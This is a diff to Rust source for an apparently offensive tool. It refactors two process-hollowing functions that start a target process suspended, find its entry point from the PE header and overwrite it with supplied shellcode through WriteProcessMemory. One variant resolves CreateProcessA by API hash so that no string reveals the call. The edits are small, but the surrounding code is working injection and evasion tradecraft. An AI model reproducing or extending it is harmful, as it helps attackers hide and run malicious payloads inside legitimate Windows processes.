@@ -30,10 +30,11 @@ pub fn hollow_and_run(shellcode: &[u8], target_process: &str) {
     // Use CreateProcessA to create a suspended process that will be hollowed out for the shellcode
     // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa
     // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Threading/fn.CreateProcessA.html
-    let mut lp_command_line = PSTR::null();
-    lp_command_line.0 = CString::new(target_process)
-        .unwrap()
-        .into_raw() as *mut u8;
+    let lp_command_line = PSTR {
+        0: CString::new(target_process)
+            .unwrap()
+            .into_raw() as *mut u8
+    };
     let creation_result = unsafe { 
         CreateProcessA(
             PCSTR::null(),
@@ -113,7 +114,6 @@ pub fn hollow_and_run(shellcode: &[u8], target_process: &str) {
     let opthdr_offset = e_lfanew as usize + OPTHDR_ADDITIONAL_OFFSET;
     let entry_point_rva = unsafe { ptr::read((head_pointer_raw + opthdr_offset) as *const u32) };
     let entry_point_address = entry_point_rva as usize + pe_base_address;
-
     let write_result = unsafe { 
         WriteProcessMemory(
             process_handle,
@@ -150,23 +150,22 @@ pub fn antistring_hollow_and_run(shellcode: &[u8], target_process: &str) {
 
     // See line 54
     let function = rco_utils::find_function_address("Kernel32", 0x6fe222ff0e96f5c4).unwrap();
-    let lp_application_name = PCSTR::null();
-    let mut lp_command_line = PSTR::null();
-    lp_command_line.0 = CString::new(target_process)
-        .unwrap()
-        .into_raw() as *mut u8;
-    let lp_current_directory = PCSTR::null();
+    let lp_command_line = PSTR {
+        0: CString::new(target_process)
+            .unwrap()
+            .into_raw() as *mut u8
+    };
     unsafe {
         mem::transmute::<*const (), fn(PCSTR, PSTR, *const SECURITY_ATTRIBUTES, *const SECURITY_ATTRIBUTES, bool, PROCESS_CREATION_FLAGS, *const i32, PCSTR, *const STARTUPINFOA, *const PROCESS_INFORMATION) -> BOOL>
         (function)(
-            lp_application_name,
+            PCSTR::null(),
             lp_command_line,
             ptr::null(),
             ptr::null(),
             false,
             CREATE_SUSPENDED,
             ptr::null(),
-            lp_current_directory,
+            PCSTR::null(),
             &startup_info,
             &mut process_information
         )
@@ -211,7 +210,7 @@ pub fn antistring_hollow_and_run(shellcode: &[u8], target_process: &str) {
             ptr::null_mut()
         )
     };
-    if header_buffer[0] != 77 || header_buffer[1] != 90 {
+    if header_buffer[0] as char != 'M' || header_buffer[1] as char != 'Z' {
         panic!("An offset looks incorrect, the DOS header magic bytes don't correspond to 'MZ'");
     }
 
